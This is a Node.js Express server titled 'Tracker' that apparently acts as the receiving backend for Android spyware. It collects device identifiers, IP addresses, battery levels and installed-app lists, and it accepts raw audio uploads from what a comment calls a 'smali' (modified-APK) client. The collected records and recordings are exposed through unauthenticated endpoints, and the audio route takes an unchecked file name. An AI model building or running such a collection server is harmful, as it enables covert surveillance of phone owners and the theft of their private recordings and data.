const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();
app.use(express.json());

const LOG_FILE = "logs.json";
const MAX_LINES = 1000;

/* ================= STORAGE ================= */

const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 10 * 1024 * 1024 }
});

app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

/* ================= SAVE LOG ================= */

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");

    const lines = fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(l => l.trim() !== '');

    if (lines.length > MAX_LINES) {
      fs.writeFileSync(LOG_FILE, lines.slice(-MAX_LINES).join("\n") + "\n");
    }

  } catch (e) {
    console.log("File error:", e.message);
  }
}

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function safeString(val, max = 100) {
  if (!val) return "unknown";
  return String(val).substring(0, max);
}

function parseApps(input) {
  if (!input) return [];

  try {
    return decodeURIComponent(input)
      .split(',')
      .map(x => x.trim())
      .filter(Boolean)
      .slice(0, 100);
  } catch {
    return [];
  }
}

/* ================= TRACK ================= */

app.get('/track', (req, res) => {
  const data = {
    ip: getIP(req),
    userAgent: req.headers['user-agent'] || "unknown",
    model: safeString(req.query.model),
    brand: safeString(req.query.brand),
    android: safeString(req.query.android),
    battery: Number(req.query.battery) || null,
    apps: parseApps(req.query.apps),
    time: new Date().toISOString()
  };

  console.log("\n🔥 DEVICE =====================");
  console.log(data);

  saveLog(data);

  res.json({ status: "ok" });
});

/* ================= AUDIO UPLOAD (HYBRID) ================= */

app.post('/upload-audio', (req, res, next) => {
  // detect multipart
  if (req.headers['content-type']?.includes('multipart')) {
    return upload.single('audio')(req, res, () => {
      if (!req.file) return res.status(400).send("No file");

      const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

      console.log("🎤 MULTIPART AUDIO:", req.file.filename);

      saveLog({
        type: "multipart",
        file: req.file.filename,
        size: req.file.size,
        url,
        time: new Date().toISOString()
      });

      res.json({ status: "uploaded", url });
    });
  }

  // RAW upload (your smali case)
  const fileName = Date.now() + ".mp3";
  const filePath = path.join(__dirname, "uploads", fileName);

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  req.on('end', () => {
    const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;

    console.log("🎤 RAW AUDIO:", fileName);

    saveLog({
      type: "raw",
      file: fileName,
      url,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", url });
  });
});

/* ================= AUDIO STREAM ================= */

app.get('/audio/:name', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.name);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }

  res.sendFile(filePath);
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {
  try {
    if (!fs.existsSync(LOG_FILE)) return res.json([]);

    const list = fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(Boolean)
      .map(x => {
        try { return JSON.parse(x); } catch { return null; }
      })
      .filter(Boolean);

    res.json(list);

  } catch {
    res.json([]);
  }
});

/* ================= CLEAR ================= */

app.get('/clear', (req, res) => {
  fs.writeFileSync(LOG_FILE, "");
  res.send("Logs cleared");
});

/* ================= HEALTH ================= */

app.get('/health', (req, res) => {
  res.json({ status: "running" });
});

/* ================= HOME ================= */

app.get('/', (req, res) => {
  res.send("Tracker running (hybrid upload ready)");
});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
